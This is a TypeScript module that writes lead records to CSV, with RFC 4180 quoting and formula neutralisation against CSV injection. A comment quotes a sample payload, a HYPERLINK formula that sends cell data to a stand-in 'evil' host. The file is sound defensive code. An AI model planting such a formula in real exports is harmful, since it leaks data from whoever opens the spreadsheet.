// CSV serialisation for the lead export.
//
// PURE, and separate from the export route, for two reasons: the escaping rules
// below are the kind of thing that is only ever verified by a test, and the
// route streams — it needs a function it can call per row without holding a
// table in memory.
//
// ===========================================================================
// TWO DIFFERENT ESCAPES, FOR TWO DIFFERENT READERS
// ===========================================================================
// 1. RFC 4180 quoting, so the FILE parses: a value containing a comma, a quote
//    or a newline is wrapped in quotes with its own quotes doubled. Get this
//    wrong and a lead whose company name contains a comma shifts every later
//    column by one, silently.
//
// 2. FORMULA NEUTRALISATION, so the SPREADSHEET does not execute it. A cell
//    beginning =, +, -, @, TAB or CR is evaluated as a formula by Excel, Sheets
//    and LibreOffice. `=HYPERLINK("https://evil/"&A1,"Click")` in a lead's name
//    field becomes a live exfiltration link the moment the owner opens the
//    export they just downloaded — the classic CSV injection, and the reason
//    this is not just `String(value)`.
//
//    The neutralisation is a LEADING APOSTROPHE, not deletion: the owner still
//    needs to read what the viewer actually typed, including a phone number
//    that legitimately starts with "+". Every major spreadsheet treats a leading
//    apostrophe as "this cell is text" and hides it in the cell view.
//
// PII NOTE: nothing here logs, and nothing here throws with a value in the
// message. A stringify failure returns "" — the export route holds the same "no
// lead field ever reaches a log line" rule as app/api/v3/leads/route.ts, and a
// serialiser that put a name in an exception would break it from underneath.

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/** Characters that force RFC 4180 quoting. */
const MUST_QUOTE = /[",\r\n]/;

/**
 * One CSV cell: formula-neutralised, then RFC 4180 quoted if it needs to be.
 *
 * null and undefined become an empty cell rather than the strings "null" and
 * "undefined" — `companySize` is optional and an owner scanning the column
 * wants a blank, not four characters of JavaScript trivia.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) {
    return "";
  }

  let raw: string;
  if (value instanceof Date) {
    // ISO-8601 UTC. Unambiguous in every locale, and the same timezone rule the
    // rollup uses — see app/lib/overlays/rollup.ts.
    raw = Number.isNaN(value.getTime()) ? "" : value.toISOString();
  } else if (typeof value === "string") {
    raw = value;
  } else if (typeof value === "number" || typeof value === "boolean") {
    raw = String(value);
  } else {
    // An object in a lead field is not a thing this app writes, but a defensive
    // "" beats [object Object] and beats a throw inside a stream.
    raw = "";
  }

  if (raw.length > 0 && FORMULA_PREFIXES.includes(raw[0])) {
    raw = `'${raw}`;
  }

  if (MUST_QUOTE.test(raw)) {
    return `"${raw.replace(/"/g, '""')}"`;
  }
  return raw;
}

/** One CSV record, CRLF-terminated as RFC 4180 requires. */
export function csvRow(values: readonly unknown[]): string {
  return `${values.map(csvCell).join(",")}\r\n`;
}

/**
 * The lead export's columns, in order.
 *
 * Header text and row order live in one module so they cannot drift: a header
 * that says "Email" over a column of company sizes is worse than no export.
 */
export const LEAD_CSV_COLUMNS = [
  "Lead ID",
  "Submitted At (UTC)",
  "Name",
  "Email",
  "Company Size",
  "Demo",
  "Demo ID",
  "Referrer",
  "Consent At (UTC)",
  "Consent Text",
  "Delivery Status",
] as const;

/** The shape the export route hands to `leadCsvRow`. */
export interface LeadCsvRecord {
  id: string;
  createdAt: Date;
  name: string;
  email: string;
  companySize: string | null;
  demoTitle: string | null;
  demoId: string;
  referrer: string | null;
  consentAt: Date | null;
  consentText: string | null;
  /** Pre-summarised by the caller, e.g. "hubspot:DELIVERED; webhook:FAILED". */
  deliveryStatus: string;
}

/** The header record. */
export function leadCsvHeader(): string {
  return csvRow(LEAD_CSV_COLUMNS);
}

/** One lead as a CSV record, in LEAD_CSV_COLUMNS order. */
export function leadCsvRow(lead: LeadCsvRecord): string {
  return csvRow([
    lead.id,
    lead.createdAt,
    lead.name,
    lead.email,
    lead.companySize,
    lead.demoTitle,
    lead.demoId,
    lead.referrer,
    lead.consentAt,
    lead.consentText,
    lead.deliveryStatus,
  ]);
}

/**
 * A one-line summary of a lead's per-connection delivery state, for the CSV's
 * last column and the inbox's status chip.
 *
 * "provider:STATUS", semicolon-separated. Deliberately not JSON: this lands in a
 * spreadsheet cell that a human reads, and it must survive being opened in
 * Excel without a formula prefix (see csvCell) or a nested quote storm.
 * "not sent" — the empty case — is spelled out rather than left blank, because a
 * blank cell reads as "nobody filled this in" rather than "CRM delivery is off".
 */
export function summarizeDeliveries(
  deliveries: readonly { provider: string; status: string }[]
): string {
  if (deliveries.length === 0) {
    return "not sent";
  }
  return deliveries.map((d) => `${d.provider}:${d.status}`).join("; ");
}
